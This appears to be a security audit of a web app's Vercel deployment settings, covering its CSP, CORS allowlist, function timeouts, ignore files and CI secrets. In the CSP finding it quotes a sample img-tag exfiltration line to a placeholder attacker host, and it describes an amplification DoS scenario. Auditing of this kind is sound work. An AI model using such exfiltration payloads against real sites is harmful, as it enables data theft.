# Category 13: Deployment Config

## vercel.json summary

- Framework: static-build (Vite SPA + `api/` serverless functions). No `framework` key declared; relies on Vercel autodetect. No `vercel.ts` present (checked `/Users/alasdairnc/Desktop/Dev/casedive/vercel.ts` — does not exist).
- Rewrites count: 3 (`/api/:path*` passthrough, `/internal/retrieval-health` -> `/`, catch-all `/(.*)` -> `/index.html`)
- Functions config present: yes (7 endpoints listed; 3 more endpoints live under `api/` without explicit config and fall back to Vercel defaults)
- CSP present: yes, on `/(.*)` with `default-src 'self'`. `script-src` includes `'unsafe-inline'` plus `pagead2.googlesyndication.com`, `www.googletagmanager.com`, `*.ingest.de.sentry.io`. `style-src` includes `'unsafe-inline'`. No `unsafe-eval`. `frame-ancestors` not set (but `X-Frame-Options: DENY` present).
- CORS allowlist: `api/_cors.js:3-7` — `https://casedive.ca`, `https://www.casedive.ca`, `https://casedive.vercel.app` (exact string match, no wildcard/regex).

## Findings

### [High] `maxDuration: 60s` on `analyze.js` enables amplification DoS against rate-limit bucket

File: `vercel.json:11`
Evidence:

```
"api/analyze.js": { "memory": 512, "maxDuration": 60 }
```

`api/analyze.js:105` sets an inner Anthropic fetch timeout of 25s (`ANTHROPIC_TIMEOUT_MS`), but the outer Vercel invocation is permitted to run for 60s. The rate limit (`api/_rateLimit.js:9-11`) is 5 requests/hour per IP. An attacker who burns all 5 tokens against `analyze.js` can tie up 5 × 60s = 300s of compute per IP per hour, per function region, consuming a seat in the concurrency pool. Distributed across an IPv6/CGNAT range this can exhaust the project-level concurrency ceiling while staying under per-IP rate limits.
Impact: Wallet / availability DoS against the most expensive endpoint (Anthropic token spend amplification, serverless GB-s amplification).
Trace confidence: Medium — exploit viability depends on Vercel plan concurrency ceiling, which is not in scope to inspect.

### [High] CSP allows `'unsafe-inline'` in `script-src`, defeating the main XSS mitigation

File: `vercel.json:40`
Evidence:

```
"script-src 'self' 'unsafe-inline' https://pagead2.googlesyndication.com https://www.googletagmanager.com https://*.ingest.de.sentry.io;"
```

`'unsafe-inline'` permits any inline `<script>` or DOM-injected inline handler to execute. Any reflected/stored HTML injection anywhere in the SPA becomes script execution. Given the app renders Anthropic-generated content (`src/components/ResultCard.jsx`, `Results.jsx`) this is the highest-leverage hardening gap. `'nonce-'` or `'strict-dynamic'` would address it; AdSense and GTM both support nonce-based loading.
Impact: XSS primitives elevate straight to JS exec. No equivalent of CSP to catch them.
Trace confidence: High.

### [High] CSP `connect-src` omits the Vercel preview host used by preview deployments

File: `vercel.json:40`
Evidence: `connect-src 'self' https://api.anthropic.com https://api.canlii.org https://*.ingest.de.sentry.io;`
The same `vercel.json` ships to production and preview deployments. `'self'` covers the preview hostname for same-origin calls, but any absolute URL emitted by build-time env substitution (e.g., `VITE_API_BASE` pointing at a deployment URL) would be blocked. More importantly, `img-src 'self' data: https:;` allows any HTTPS image host — this blunts CSP as an exfiltration control (attacker can exfil via `<img src="https://attacker/?data=...">`). Combined with the `'unsafe-inline'` finding above, CSP offers little exfil defense.
Impact: CSP is not an effective exfiltration boundary for this app.
Trace confidence: High.

### [Medium] `casedive.vercel.app` is in the CORS allowlist — preview deploys on this hostname are exposed

File: `api/_cors.js:3-7`
Evidence:

```
export const ALLOWED_ORIGINS = [
  "https://casedive.ca",
  "https://www.casedive.ca",
  "https://casedive.vercel.app",
];
```

`casedive.vercel.app` is the auto-generated Vercel production alias. Because the comparison is `ALLOWED_ORIGINS.includes(origin)` (`_cors.js:18`), it is an exact-string match — so subdomain takeover lookalikes such as `https://casedive.vercel.app.attacker.com` do NOT match (ruled out). However, anyone who can deploy or preview-branch onto the Vercel project inherits this origin and can invoke the APIs cross-origin. Branch-preview URLs (`casedive-git-<branch>-<user>.vercel.app`) are NOT in the allowlist — cross-origin XHR from those previews to prod APIs will be blocked, which is fine, but any feature that expects the preview to hit prod APIs is broken silently.
Impact: Limited blast radius — anyone with deploy access to the Vercel project already has write access to the codebase. The real issue is the dormant listing of an alt-domain production origin with no stated purpose.
Trace confidence: High.

### [Medium] `frame-ancestors` directive absent from CSP

File: `vercel.json:40`
Evidence: CSP has `object-src 'none'; base-uri 'self'; form-action 'self'` but no `frame-ancestors`.
`X-Frame-Options: DENY` is set at `vercel.json:32` which covers legacy browsers. However, `X-Frame-Options` is deprecated in favor of CSP `frame-ancestors`; some newer browsers prefer the CSP directive and may ignore XFO when CSP is present. Modern browsers currently still honor XFO, so this is header hygiene rather than a live clickjacking hole.
Impact: Belt-and-suspenders clickjacking coverage missing.
Trace confidence: Medium.

### [Medium] `X-XSS-Protection: 1; mode=block` is obsolete and can introduce XSS in old browsers

File: `vercel.json:33`
Evidence: `{ "key": "X-XSS-Protection", "value": "1; mode=block" }`
Chrome removed the XSS auditor; some old versions had bugs where `1; mode=block` itself introduced vulnerabilities (XS-Leaks). Current guidance is `X-XSS-Protection: 0`. Low live risk — very few users on affected browsers — but it is a stale directive.
Impact: Stale header, minor historical risk.
Trace confidence: High.

### [Medium] `maxDuration` / `memory` not set for `api/status.js`, `api/report-case-law.js`, and `api/_caseLawReportStore.js` (new files)

File: `vercel.json:9-17` vs `api/` directory listing
Evidence: The `functions` object configures 7 endpoints but `api/status.js` and the newly-added `api/report-case-law.js` (untracked in git status) are absent. They inherit Vercel account defaults (10s timeout on Hobby, or whatever is set at the project level), not the per-endpoint contract declared for siblings. This is inconsistent; new endpoints added without a `vercel.json` update silently drift from the declared operational envelope.
Impact: Operational drift, no security impact on its own.
Trace confidence: High.

### [Low] No `.vercelignore` present

File: `/Users/alasdairnc/Desktop/Dev/casedive/.vercelignore` (missing)
Evidence: File does not exist. Vercel falls back to `.gitignore` for the upload filter. `.gitignore` excludes `dist`, `playwright-report*`, `test-results`, `.env*`, `.vercel`, `logs/`, `reports/`, `.retrieval-health-token`, `.claude/settings.local.json`, `.claude/mcp.json`, `.claude/worktrees/`, `tmp/`, `.claude-flow/`, `.swarm/`. However, `.claude/` (the non-ignored portions, including `.claude/skills/`, `.claude/projects/`, `.claude/rules/`) IS uploaded to Vercel and bundled into the deployment tarball. `security_audit/`, `artifacts/`, `docs/`, `scripts/` are also uploaded. None of these are served because they are outside `public/`, but they are visible to anyone who can read the deployment filesystem (e.g., via a path traversal or a `fs.readFile` bug). `.env` is correctly excluded.
Impact: Minor — internal dev notes, audit artifacts, and prompts are shipped to the deployment filesystem. Not directly reachable over HTTP given current rewrites, but the attack surface is larger than needed.
Trace confidence: High.

### [Low] `.retrieval-health-token` file exists on disk and is `.gitignore`'d, but the path is still uploaded if it slips into a staged commit

File: `/Users/alasdairnc/Desktop/Dev/casedive/.retrieval-health-token` (43 bytes, on disk; git-ignored)
Evidence: Token lives in a plain file at the repo root. It is in `.gitignore:19`. A `.vercelignore` with an explicit `.retrieval-health-token` entry would provide defense-in-depth against a future accidental-commit-before-gitignore scenario.
Impact: Minor — depends on developer discipline around `git add -A`.
Trace confidence: High.

### [Low] Rewrite `/internal/retrieval-health -> /` is cosmetic; real endpoint is `/api/retrieval-health`

File: `vercel.json:6`
Evidence: `{ "source": "/internal/retrieval-health", "destination": "/" }`
This rewrite sends `/internal/retrieval-health` to the SPA index, likely to hide the endpoint path from casual discovery. The real protected endpoint is `/api/retrieval-health` (with bearer-token check). The rewrite does NOT create a bypass — the `/api/:path*` passthrough at `vercel.json:5` is a no-op and the catch-all for non-api requests at `vercel.json:7` serves the SPA. No rewrite routes an unprotected path to a protected endpoint or vice versa.
Impact: No security impact; flagging as hygiene only.
Trace confidence: High.

### [Low] `dist/` directory is present on disk but not tracked in git

File: `/Users/alasdairnc/Desktop/Dev/casedive/dist/`
Evidence: `git check-ignore dist` returns `dist` (ignored). `git ls-files dist/` returns empty. `dist/` contains `about.html`, `privacy.html`, `terms.html`, `ads.txt`, `index.html`, `assets/`, `logos/`, `og-image.png`, `robots.txt`, `sitemap.xml` — this is a local build artifact and is correctly excluded from git. No leak.
Impact: None — confirming the check passed.
Trace confidence: High.

### [Low] GitHub Actions secrets are referenced through `env:` blocks, including `ANTHROPIC_API_KEY` exposed as a step env

File: `.github/workflows/preview-self-heal.yml:31`, `.github/workflows/overnight-security-loop.yml` (self-heal step), `.github/workflows/claude-review.yml:62`, `.github/workflows/claude-headless-probe.yml:38`
Evidence:

```
HAS_ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}     # preview-self-heal.yml:31
ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}          # preview-self-heal.yml:244
```

`HAS_ANTHROPIC_API_KEY` is used as a presence gate (`if: env.HAS_ANTHROPIC_API_KEY != ''`), which exports the full secret into the job environment even for steps that only need to check presence. GitHub masks secrets in logs, but any step that intentionally or accidentally dumps env (e.g., `printenv | tee`) will emit the mask `***`, not the value — so this is hygiene rather than live exposure. Workflows are all manual (`workflow_dispatch`) or scheduled (`cron`), and `preview-self-heal.yml` has the `allow_self_heal` gate requiring explicit opt-in before invoking Claude; no workflow auto-pushes production code.
Impact: No direct leak, but `HAS_*` secrets pattern is a known footgun — prefer `secrets.* != ''` expressions at the `if:` level so the secret is never materialized into `env`.
Trace confidence: Medium.

### [Low] `production-retrieval-autofix.yml` has `contents: write` and `pull-requests: write` — the scheduled job can push branches

File: `.github/workflows/production-retrieval-autofix.yml:21-24`
Evidence:

```
permissions:
  actions: read
  contents: write
  pull-requests: write
```

Runs on `cron: "15 7 * * *"`. The job creates a PR, not a direct push to main, and `allow_claude` defaults to `"false"`. No direct prod deploy without checks. Still, an attacker with a write-foothold in this file could flip the defaults.
Impact: Configured safely today; audit finding is to note the scheduled-write posture.
Trace confidence: High.

## False Alarms

- **CORS subdomain-lookalike `casedive.vercel.app.attacker.com`**: `api/_cors.js:18` uses `ALLOWED_ORIGINS.includes(origin)` — strict string equality. Lookalike attack does not apply.
- **`unsafe-eval` in CSP**: not present. Only `'unsafe-inline'` is present.
- **`dist/` committed to git**: not committed; `.gitignore:2` excludes it; `git ls-files dist/` returns empty.
- **`.next/` tracked**: project is Vite, no `.next/` exists.
- **Rewrite-based rate-limit bypass**: the only rewrites are `/api/:path*` (identity), `/internal/retrieval-health` -> `/` (sends to SPA, not to protected endpoint), and the SPA catch-all. None of them route to a different handler than the source path suggests. `checkRateLimit` is keyed by IP not by path, so any rewrite would still hit the same bucket anyway.
- **Preview deployments open/public**: `vercel.json` has no `"public"` flag. Preview protection is controlled at the Vercel project level (dashboard), which is out of scope for static config inspection. If the project is on Hobby and password protection is not enabled, previews are publicly reachable — flagging as a **Coverage Gap** rather than a finding because I cannot verify from repo contents.

## Coverage Gaps

- **Preview deployment protection posture** cannot be verified from repo files alone. `.vercel/project.json` gives `projectId` and `orgId` but not the "deployment protection" setting. Verify in the Vercel dashboard under _Settings > Deployment Protection_ whether previews require `vercel-sso` / password / `x-vercel-protection-bypass`. If unprotected, preview URLs leak the full API surface (with the legitimate origin `casedive-git-*.vercel.app` not in the CORS allowlist, so browser attacks from them are blocked — but the attacker can still hit APIs directly, bypassing CORS which is not a server-side control).
- **Vercel plan concurrency ceiling** — the DoS finding above depends on the max concurrent invocations, which lives in the Vercel dashboard.
- **CSP reporting endpoint** — no `report-uri` or `report-to` directive, so CSP violations in production go unobserved. Cannot tell whether this is an intentional trade-off.
- **Project-level env vars on Vercel** (not just `.env`) — `vercel env ls` would show any vars that differ between preview/production (e.g., rate-limit disabled on preview). Cannot be audited from files.
- **`vercel.ts` migration** — repo has no `vercel.ts`. Per the project's own new-knowledge doc this is the recommended approach; the static `vercel.json` is still supported but lacks type checking.
